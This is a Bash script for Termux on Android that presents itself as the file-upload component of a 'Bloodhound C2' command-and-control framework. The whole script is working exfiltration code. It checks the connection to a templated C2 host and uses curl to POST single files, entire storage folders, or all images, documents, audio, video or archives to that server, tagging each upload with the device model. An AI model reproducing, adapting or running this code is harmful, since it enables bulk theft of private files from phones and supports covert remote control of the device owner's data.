#!/data/data/com.termux/files/usr/bin/bash

# Android File Upload Script for Bloodhound C2 - Termux Storage Access
# This script automatically uploads files from Android storage to the C2 server
# Uses termux-setup-storage permissions for full file access

# C2 server configuration
C2_SERVER="http://{C2_HOST}:{C2_PORT}"
HOSTNAME=$(getprop ro.product.model 2>/dev/null || echo "Android_Device")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
MAX_CONCURRENT_UPLOADS=5
UPLOAD_TIMEOUT=60
LOG_FILE="/data/data/com.termux/files/home/.upload.log"

# Logging function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${BLUE}[$timestamp]${NC} ${GREEN}[$level]${NC} $message"
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Check if curl is available
check_dependencies() {
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl is not available${NC}"
        echo "Please install curl: pkg install curl"
        exit 1
    fi
    
    if ! command -v find >/dev/null 2>&1; then
        echo -e "${RED}Error: find command not available${NC}"
        exit 1
    fi
}

# Test C2 server connection
test_c2_connection() {
    log "INFO" "Testing C2 server connection..."
    
    local response=$(curl -s -m 10 "$C2_SERVER/api/files/list" 2>/dev/null)
    if [ -n "$response" ]; then
        log "INFO" "C2 server connection successful"
        return 0
    else
        log "ERROR" "C2 server connection failed"
        return 1
    fi
}

# Format file size
format_file_size() {
    local bytes="$1"
    
    if [ "$bytes" -eq 0 ]; then
        echo "0 B"
        return
    fi
    
    local k=1024
    local sizes=("B" "KB" "MB" "GB" "TB")
    local i=0
    
    while [ "$bytes" -ge "$k" ] && [ "$i" -lt 4 ]; do
        bytes=$((bytes / k))
        i=$((i + 1))
    done
    
    echo "${bytes} ${sizes[$i]}"
}

# Upload single file
upload_file() {
    local file_path="$1"
    local description="$2"
    local tags="$3"
    
    if [ ! -f "$file_path" ]; then
        log "ERROR" "File not found: $file_path"
        return 1
    fi
    
    local file_name=$(basename "$file_path")
    local file_size=$(stat -c %s "$file_path" 2>/dev/null || echo "0")
    local file_size_formatted=$(format_file_size "$file_size")
    
    log "INFO" "Uploading: $file_name ($file_size_formatted)"
    
    # Create multipart form data
    local boundary="boundary_$(date +%s)_$(shuf -i 1000-9999 -n 1)"
    
    # Build the multipart form data
    local form_data=""
    form_data+="--$boundary\r\n"
    form_data+="Content-Disposition: form-data; name=\"hostname\"\r\n\r\n"
    form_data+="$HOSTNAME\r\n"
    form_data+="--$boundary\r\n"
    form_data+="Content-Disposition: form-data; name=\"description\"\r\n\r\n"
    form_data+="$description\r\n"
    form_data+="--$boundary\r\n"
    form_data+="Content-Disposition: form-data; name=\"tags\"\r\n\r\n"
    form_data+="$tags\r\n"
    form_data+="--$boundary\r\n"
    form_data+="Content-Disposition: form-data; name=\"file\"; filename=\"$file_name\"\r\n"
    form_data+="Content-Type: application/octet-stream\r\n\r\n"
    
    # Create temporary files for the upload
    local temp_header="/tmp/upload_header_$$"
    local temp_footer="/tmp/upload_footer_$$"
    
    # Write header
    echo -en "$form_data" > "$temp_header"
    
    # Write footer
    echo -en "\r\n--$boundary--\r\n" > "$temp_footer"
    
    # Upload using curl with multipart data
    local response=$(curl -s -X POST "$C2_SERVER/api/files/upload" \
        -H "Content-Type: multipart/form-data; boundary=$boundary" \
        --data-binary "@$temp_header" \
        --data-binary "@$file_path" \
        --data-binary "@$temp_footer" \
        -m "$UPLOAD_TIMEOUT" 2>/dev/null)
    
    # Clean up temp files
    rm -f "$temp_header" "$temp_footer"
    
    if [ -n "$response" ]; then
        log "INFO" "Upload successful: $file_name"
        return 0
    else
        log "ERROR" "Upload failed: $file_name"
        return 1
    fi
}

# Upload directory recursively
upload_directory() {
    local dir_path="$1"
    local base_description="$2"
    local base_tags="$3"
    
    if [ ! -d "$dir_path" ]; then
        log "ERROR" "Directory not found: $dir_path"
        return 1
    fi
    
    log "INFO" "Starting recursive upload of directory: $dir_path"
    
    # Find all files recursively
    local all_files=$(find "$dir_path" -type f -readable 2>/dev/null | head -1000)
    local total_files=$(echo "$all_files" | wc -l)
    
    if [ "$total_files" -eq 0 ]; then
        log "WARN" "No readable files found in directory: $dir_path"
        return 1
    fi
    
    log "INFO" "Found $total_files files to upload"
    log "INFO" "Using parallel uploads (max $MAX_CONCURRENT_UPLOADS concurrent)"
    
    local success_count=0
    local fail_count=0
    local current_file=0
    
    # Process files in parallel batches
    echo "$all_files" | while IFS= read -r file_path; do
        current_file=$((current_file + 1))
        
        # Skip if file is not readable
        if [ ! -r "$file_path" ]; then
            log "WARN" "Skipping unreadable file: $file_path"
            continue
        fi
        
        # Get relative path for description
        local relative_path="${file_path#$dir_path}"
        relative_path="${relative_path#/}"
        
        # Create description
        local description="$base_description - $relative_path"
        
        # Upload file
        if upload_file "$file_path" "$description" "$base_tags"; then
            success_count=$((success_count + 1))
            echo -e "${GREEN}✓${NC} $relative_path"
        else
            fail_count=$((fail_count + 1))
            echo -e "${RED}✗${NC} $relative_path"
        fi
        
        # Show progress
        if [ $((current_file % 10)) -eq 0 ]; then
            log "INFO" "Progress: $current_file/$total_files files processed"
        fi
        
        # Limit concurrent uploads
        if [ $((current_file % MAX_CONCURRENT_UPLOADS)) -eq 0 ]; then
            sleep 1
        fi
    done
    
    log "INFO" "Directory upload completed"
    log "INFO" "Success: $success_count, Failed: $fail_count"
    
    return $fail_count
}

# Get upload target from user
get_upload_target() {
    echo -e "${CYAN}=== Android File Upload Options ===${NC}"
    echo "1. Upload single file"
    echo "2. Upload entire Downloads folder"
    echo "3. Upload entire Pictures folder"
    echo "4. Upload entire Documents folder"
    echo "5. Upload entire Music folder"
    echo "6. Upload entire Videos folder"
    echo "7. Upload custom directory"
    echo "8. Upload specific file types (images, documents, etc.)"
    echo ""
    
    read -p "Enter your choice (1-8): " choice
    
    case "$choice" in
        1)
            read -p "Enter full file path: " file_path
            if [ -f "$file_path" ] && [ -r "$file_path" ]; then
                echo "file:$file_path"
            else
                echo -e "${RED}Invalid file path or not readable${NC}"
                return 1
            fi
            ;;
        2)
            echo "dir:$HOME/storage/downloads"
            ;;
        3)
            echo "dir:$HOME/storage/pictures"
            ;;
        4)
            echo "dir:$HOME/storage/documents"
            ;;
        5)
            echo "dir:$HOME/storage/music"
            ;;
        6)
            echo "dir:$HOME/storage/movies"
            ;;
        7)
            read -p "Enter directory path: " dir_path
            if [ -d "$dir_path" ] && [ -r "$dir_path" ]; then
                echo "dir:$dir_path"
            else
                echo -e "${RED}Invalid directory path or not readable${NC}"
                return 1
            fi
            ;;
        8)
            echo "types"
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            return 1
            ;;
    esac
}

# Upload specific file types
upload_file_types() {
    local base_dir="$1"
    local file_types="$2"
    local description="$3"
    local tags="$4"
    
    log "INFO" "Uploading $file_types files from $base_dir"
    
    # Find files by type
    local files=$(find "$base_dir" -type f -readable 2>/dev/null | grep -E "\.($file_types)$" | head -500)
    local total_files=$(echo "$files" | wc -l)
    
    if [ "$total_files" -eq 0 ]; then
        log "WARN" "No $file_types files found in $base_dir"
        return 1
    fi
    
    log "INFO" "Found $total_files $file_types files to upload"
    
    local success_count=0
    local fail_count=0
    
    echo "$files" | while IFS= read -r file_path; do
        local relative_path="${file_path#$base_dir}"
        relative_path="${relative_path#/}"
        local file_description="$description - $relative_path"
        
        if upload_file "$file_path" "$file_description" "$tags"; then
            success_count=$((success_count + 1))
            echo -e "${GREEN}✓${NC} $relative_path"
        else
            fail_count=$((fail_count + 1))
            echo -e "${RED}✗${NC} $relative_path"
        fi
    done
    
    log "INFO" "File type upload completed: $file_types"
    log "INFO" "Success: $success_count, Failed: $fail_count"
}

# Main execution
main() {
    echo -e "${CYAN}=== Android File Upload Script for Bloodhound C2 ===${NC}"
    echo "Termux Storage Access Enabled"
    echo "C2 Server: $C2_SERVER"
    echo "Device: $HOSTNAME"
    echo ""
    
    # Check dependencies
    check_dependencies
    
    # Test C2 connection
    if ! test_c2_connection; then
        echo -e "${RED}Cannot connect to C2 server. Exiting.${NC}"
        exit 1
    fi
    
    # Get upload target
    local target=$(get_upload_target)
    if [ $? -ne 0 ]; then
        echo -e "${RED}Failed to get upload target. Exiting.${NC}"
        exit 1
    fi
    
    # Parse target
    local target_type="${target%%:*}"
    local target_path="${target#*:}"
    
    case "$target_type" in
        "file")
            log "INFO" "Uploading single file: $target_path"
            local file_name=$(basename "$target_path")
            local description="Android file upload - $file_name"
            local tags="android,termux,file,upload"
            
            if upload_file "$target_path" "$description" "$tags"; then
                echo -e "${GREEN}File upload completed successfully!${NC}"
            else
                echo -e "${RED}File upload failed!${NC}"
                exit 1
            fi
            ;;
        "dir")
            log "INFO" "Uploading directory: $target_path"
            local dir_name=$(basename "$target_path")
            local description="Android directory upload - $dir_name"
            local tags="android,termux,directory,upload"
            
            if upload_directory "$target_path" "$description" "$tags"; then
                echo -e "${GREEN}Directory upload completed successfully!${NC}"
            else
                echo -e "${RED}Directory upload failed!${NC}"
                exit 1
            fi
            ;;
        "types")
            echo -e "${CYAN}=== File Type Upload Options ===${NC}"
            echo "1. Images (jpg, png, gif, bmp)"
            echo "2. Documents (pdf, doc, txt, rtf)"
            echo "3. Audio (mp3, wav, aac, flac)"
            echo "4. Video (mp4, avi, mkv, mov)"
            echo "5. Archives (zip, rar, 7z, tar)"
            echo ""
            
            read -p "Enter file type choice (1-5): " type_choice
            
            case "$type_choice" in
                1)
                    upload_file_types "$HOME/storage" "jpg|jpeg|png|gif|bmp|webp" "Android images upload" "android,termux,images,upload"
                    ;;
                2)
                    upload_file_types "$HOME/storage" "pdf|doc|docx|txt|rtf|odt" "Android documents upload" "android,termux,documents,upload"
                    ;;
                3)
                    upload_file_types "$HOME/storage" "mp3|wav|aac|flac|ogg|m4a" "Android audio upload" "android,termux,audio,upload"
                    ;;
                4)
                    upload_file_types "$HOME/storage" "mp4|avi|mkv|mov|wmv|flv" "Android video upload" "android,termux,video,upload"
                    ;;
                5)
                    upload_file_types "$HOME/storage" "zip|rar|7z|tar|gz|bz2" "Android archives upload" "android,termux,archives,upload"
                    ;;
                *)
                    echo -e "${RED}Invalid choice${NC}"
                    exit 1
                    ;;
            esac
            ;;
        *)
            echo -e "${RED}Invalid target type: $target_type${NC}"
            exit 1
            ;;
    esac
    
    echo ""
    echo -e "${GREEN}=== Upload Process Completed ===${NC}"
    echo "Check your C2 server dashboard for uploaded files"
}

# Run main function
main "$@"
